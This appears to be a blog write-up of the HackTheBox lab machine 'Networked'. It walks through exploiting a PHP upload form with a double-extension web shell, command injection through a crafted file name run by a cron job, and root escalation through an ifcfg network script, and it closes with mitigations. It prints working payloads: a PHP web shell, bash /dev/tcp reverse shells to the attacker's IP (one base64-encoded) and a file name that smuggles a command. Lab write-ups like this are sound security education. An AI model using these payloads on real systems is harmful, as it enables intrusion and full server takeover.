---
title: "HTB: Networked"
date: 2026-11-01 18:00:00 +0200
categories: [HackTheBox, Easy, Linux]
tags: [linux, file-upload, command-injection, cron, sudo]
description: An easy Linux machine with a PHP server 
media_subpath: /assets/imgs/posts/networked/
image:
  path: banner.png
  alt: HTB - Networked
# Optional switches (defaults shown):
# toc: true
# comments: true
# pin: false
# render_with_liquid: true   # set to false if code blocks contain {{ }} or {% %}
---

`networked` is an easy machine that starts with a web server which has a backup file revealing its source code. We find that there is a hidden upload endpoint that is vulnerable to File Upload attacks using double extensions. Then, on the box, there is another php script running as a cron job and is vulnerable to command injection. Finally, we exploit a script running as root using `sudo` that executes the `ifup` network script.

## Enumeration
### nmap
```bash
nousa@kali-home:~/htb/lab/networked$ nmap -p- --min-rate 10000 10.129.90.113
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 19:51 +0200
Nmap scan report for 10.129.90.113
Host is up (0.031s latency).
Not shown: 65513 filtered tcp ports (no-response), 19 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https

Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds
nousa@kali-home:~/htb/lab/networked$ nmap -p22,80,443 -sC -sV -oA nmap/networked 10.129.90.113
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 19:52 +0200
Nmap scan report for 10.129.90.113
Host is up (0.036s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
```
`nmap` shows two open ports `22` and `80`, and one closed port `443`. All other ports are filtered and therefore hidden. When doing CTFs, I like to run a quick full port scan using `--min-rate 10000` first, then do a service scan on the ports I find. A possible side effect of running the scan at a very high rate is the possibility of missing some open ports. I run another slow scan in the background afterwards to see if some new ports appear. 
Otherwise, the machine is a `CentOS` machine running `ssh` on port `22` and `apache` on port `80`. 
### The Web Server on Port 80
![http://10.129.90.113/](webpage.png)
_http://10.129.90.113/_

We also see the following in the source
```html
<html> <body> Hello mate, we're building the new FaceMash!</br> Help by funding us and be the new Tyler&Cameron!</br> Join us at the pool party this Sat to get a glimpse <!-- upload and gallery not yet linked --> </body> </html>
```

Next thing to do is fuzz endpoints of the server, which shows that there is a `backup/` directory and an `uploads/` directory.
```bash
$ feroxbuster -u http://10.129.90.113/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
<SNIP>
301      GET        7l       20w      236c http://10.129.90.113/uploads => http://10.129.90.113/uploads/
301      GET        7l       20w      235c http://10.129.90.113/backup => http://10.129.90.113/backup/
200      GET      201l      582w    10240c http://10.129.90.113/backup/backup.tar
200      GET        8l       40w      229c http://10.129.90.113/
200      GET        1l        1w        2c http://10.129.90.113/uploads/
[####################] - 33s    86020/86020   0s      found:5       errors:0
[####################] - 32s    43008/43008   1359/s  http://10.129.90.113/
[####################] - 32s    43008/43008   1362/s  http://10.129.90.113/uploads/
[####################] - 0s     43008/43008   341333/s http://10.129.90.113/backup/ => Directory listing (add --scan-dir-listings to scan)
```
#### /backup
Visiting `http://10.129.90.113/backup` shows a `backup.tar` file.

![http://10.129.90.113/backup](backup_listing.png)
_http://10.129.90.113/backup_

Download the file, extract it and check the contents.
```bash
$ tar -xf ../backup.tar
$ ls
index.php  lib.php  photos.php  upload.php
```
Checking `upload.php` and `lib.php` we see the upload logic. 
```php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```
and `lib.php`
```php
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

// ...

?>
```
File upload does the following:
1. `file_mime_type` looks at the first few bytes of the uploaded file (called the magic bytes) to guess its type against a database of known magic bytes. If the file type does not start with `image/`, it is rejected.
2. Another file type check is performed through the extension, where the file is validated to end with one of allowed image extensions.
3. Splits the submitted file name using [`explode`](https://www.php.net/manual/en/function.explode.php) at dots, and takes the first part as its name and the rest as the extension using [`array_shift`](https://www.php.net/manual/en/function.array-shift.php) then removes `_` from the file name (first entry of the array) and replaces them with a dot (the name is then thrown away). The function then returns  the first part of the exploded array as the name, and the rest of the array as an extension using [`implode`](https://www.php.net/manual/en/function.implode.php)
4. Saves the file name as the IP address of the uploader with dots replaced with underscores, followed by the extension returned from the previous steps (if the IP is `127.0.0.1` and the extension is `jpg`, the file name would be `127_0_0_1.jpg`)
5. The file is finally saved under `uploads/NEW_NAME.EXT`
If the uploaded image has the name `img.php.gif`, and our IP address is `10.10.15.234`, the final filename is `10_10_15_234.php.gif`, and the `.php` survives. The problem with this logic is that it can be vulnerable to double extension attacks. If the server is configured to treat files that contain `.php` anywhere in its name as PHP files, an attacker can execute a file ending with `.php.gif` as php.

While fuzzing, we did not find `upload.php`, which is because we did not add the `php` extension in `feroxbuster`. Trying it out shows that the file actually exists.

## Exploitation
Using `Burp Suite`, upload a file named `img.php.gif` with the magic bytes of a `GIF` file (you can check magic bytes [here](https://en.wikipedia.org/wiki/List_of_file_signatures) )
![File Upload using Burp Suite](file_upload.png)
_Uploading the file using Burp Suite_

```http
POST /upload.php HTTP/1.1
Host: 10.129.90.113
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary99dc2d91e6e6cd10d9f1f7de5d02e583
Content-Length: 368
Origin: http://10.129.90.113
Connection: keep-alive
Referer: http://10.129.90.113/upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary99dc2d91e6e6cd10d9f1f7de5d02e583
Content-Disposition: form-data; name="myFile"; filename="img.php.gif"
Content-Type: image/gif

GIF89a <?php system($_REQUEST['cmd']); ?>
------geckoformboundary99dc2d91e6e6cd10d9f1f7de5d02e583
Content-Disposition: form-data; name="submit"

go!
------geckoformboundary99dc2d91e6e6cd10d9f1f7de5d02e583--
```


We can then try running `id` on the machine
![http://10.129.90.113/uploads/10_10_15_234.php.gif?cmd=id](rce.png)
_http://10.129.90.113/uploads/10_10_15_234.php.gif?cmd=id_

Code execution works. We can get a reverse shell. Run a `netcat` listener locally on port `9001`
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
```
Then send a request with a reverse shell payload in the `cmd` parameter (the payload must be url-encoded to be sent in an HTTP request)
![Reverse Shell payload](reverse_shell.png)
_Reverse Shell payload in Burp Suite_

```http
GET /uploads/10_10_15_234.php.gif?cmd=bash+-c+'bash+-i+>%26/dev/tcp/10.10.15.234/9001+0>%261' HTTP/1.1
Host: 10.129.90.113
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

We get a hit on our listener and gain a foothold as the `apache` user.  
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.234] from (UNKNOWN) [10.129.90.113] 32844
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```
## Privilege Escalation
### Apache to guly

The first thing to do is elevate to a better shell (PTY).
```bash
bash-4.2$ which python3
which python3
which: no python3 in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin)
```
There is no `python3` on the machine. We can use `script` instead.
```bash
bash-4.2$ SHELL=/bin/bash script -q /dev/null

```

Looking at users with a shell, we find a user named `guly`
```bash
bash-4.2$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
guly:x:1000:1000:guly:/home/guly:/bin/bash
```

Let's check `guly`'s home if we can
```bash
bash-4.2$ cd /home/guly
bash-4.2$ ls
check_attack.php  crontab.guly	user.txt
```
`guly`'s home directory contains a file named `check_attack.php`

```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
and it is run using the crontab file every three minutes
```bash
bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```
The script checks the directory `/var/www/html/uploads/` for any malicious files and removes them by passing them directly to `exec`.  If we can add a file that is considered malicious by the PHP script, we can potentially inject commands as `guly`.
```bash
bash-4.2$ ls -lah /var/www/html
total 24K
drwxr-xr-x. 4 root root 4.0K Jul  9  2019 .
drwxr-xr-x. 4 root root   33 Jul  2  2019 ..
drwxr-xr-x  2 root root   24 Jul  9  2019 backup
-rw-r--r--  1 root root  229 Jul  9  2019 index.php
-rw-r--r--. 1 root root 2.0K Oct 30  2018 lib.php
-rw-r--r--  1 root root 1.9K Oct 30  2018 photos.php
-rw-r--r--  1 root root 1.3K Oct 30  2018 upload.php
drwxrwxrwx. 2 root root 4.0K Oct 28 16:53 uploads
```
The `uploads` directory is world-writable. Let's drop a reverse shell there.
```bash
$ echo "bash -i  >&/dev/tcp/10.10.15.234/9001  0>&1 " | base64
YmFzaCAtaSAgPiYvZGV2L3RjcC8xMC4xMC4xNS4yMzQvOTAwMSAgMD4mMSAK
```
The reverse shell payload we use has a lot of problematic characters such as `/`. It is better to make the payload simpler in these cases, instead of having a complex payload that has a higher potential of not working. Let's generate a "nice" base64 string that does not include any bad characters. While `base64` strings can contain `+`, `=` or `/`, we can introduce extra spaces in the payload in order to remove these characters.

Now, we drop a file named `a;echo YmFzaCAtaSAgPiYvZGV2L3RjcC8xMC4xMC4xNS4yMzQvOTAwMSAgMD4mMSAK|base64 -d|bash`.

When the payload is processed by the script, it fails validation since the name is not a valid IP. The script then runs `nohup /bin/rm -f /var/www/html/uploads/a;echo YmFzaCAtaSAgPiYvZGV2L3RjcC8xMC4xMC4xNS4yMzQvOTAwMSAgMD4mMSAK|base64 -d|bash > /dev/null 2>&1 &`. The `;` ends the `rm` command, then the rest is executed (the base64 string is decoded and executed as a bash command).
```bash
bash-4.2$ touch "/var/www/html/uploads/a;echo YmFzaCAtaSAgPiYvZGV2L3RjcC8xMC4xMC4xNS4yMzQvOTAwMSAgMD4mMSAK|base64 -d|bash"
bash-4.2$ ls /var/www/html/uploads
10_10_15_234.php.gif
127_0_0_1.png
127_0_0_2.png
127_0_0_3.png
127_0_0_4.png
a;echo YmFzaCAtaSAgPiYvZGV2L3RjcC8xMC4xMC4xNS4yMzQvOTAwMSAgMD4mMSAK|base64 -d|bash
index.html
```
Start a listener on port 9001
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
```
Then we wait...
After a couple of minutes, we get a hit back
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.234] from (UNKNOWN) [10.129.90.113] 32856
bash: no job control in this shell
[guly@networked ~]$ cat user.txt
44xxxxxxxxxxxxxxxxxxxxxxxxxxxxd0
```
### guly to root
```bash
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

We find that we can run `/usr/local/sbin/changename.sh` as root
```bash
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```
If we try running it we get an error as `sudo` requires an interactive shell
```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
```
Let's use `script` again to elevate our shell.
```bash
[guly@networked ~]$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null
```
Doing a quick search about `ifup` leads us to a [HackTricks entry](https://hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html) which says that if we can inject values for the config entries in `/etc/sysconfig/network-scripts/ifcfg-guly`, then we can execute commands ([Vulnerability Reference](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)). The entries inside the `ifcfg-guly` file are of the form `KEY=VALUE`, which is executed using `bash`. If we write `KEY=VALUE CMD`, then `CMD` gets executed with the environment variable `KEY=VALUE`. Since the script runs as `root`, we can escalate privileges this way.

Let's test this by running `sudo /usr/local/sbin/changename.sh` then writing `name /usr/bin/id` for `NAME`. The script  keeps asking for input but as long as we type anything for each of the values of `$var`, it would work (just set every other value to `a`)
```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME: name /usr/bin/id
<SNIP>
uid=0(root) gid=0(root) groups=0(root)
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```
From here, we can run `bash` or get a reverse shell to name a few options.
#### Option 1: Run `bash`
Since `sudo` keeps `/usr/bin` in the `PATH` environment variable, we do not need to supply the whole path for `bash`
```bash
# run sudo /usr/local/sbin/changename.sh and then type "name bash<enter>a<enter>a<enter>a<enter>"
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
<SNIP>
wrong input, try again
interface BOOTPROTO:
[root@networked network-scripts]#
```

#### Option 2: Reverse shell
Another option is to run a reverse shell. Since the reverse shell payload contains characters that would get rejected by the `changename.sh` script, we can write the payload to a file and run the file.
```bash
[guly@networked ~]$ echo "bash -c 'bash -i >&/dev/tcp/10.10.15.234/9001 0>&1'" > revshell
[guly@networked ~]$ chmod +x revshell

```
Start a listener on port `9001`
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
```
We then run the command again, writing `name /home/guly/revshell` for the `NAME`, and anything (non-empty string) for the rest. We get a shell as `root`
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.234] from (UNKNOWN) [10.129.90.113] 32914
[root@networked network-scripts]# cd /root
[root@networked ~]# ls
root.txt
[root@networked ~]# cat root.txt
41xxxxxxxxxxxxxxxxxxxxxxxxxxxxac
```

# Mitigation
* Generate random file names that keep only the last part of the extension on upload. This way the double extension attack does not work as the `.php` part does not survive
* In the `Apache` config, use `SetHandler` to only execute files ending with `.php` as `php` files (using. `.php$`),  rather than the default `AddHandler` which executes any file containing `.php`.
* Avoid passing user input into any system command. If files are to be deleted using a script, use APIs that escape input characters, or use the `escapeshellarg()` function.
* Do not allow spaces in the modified config file through `changename.sh`.
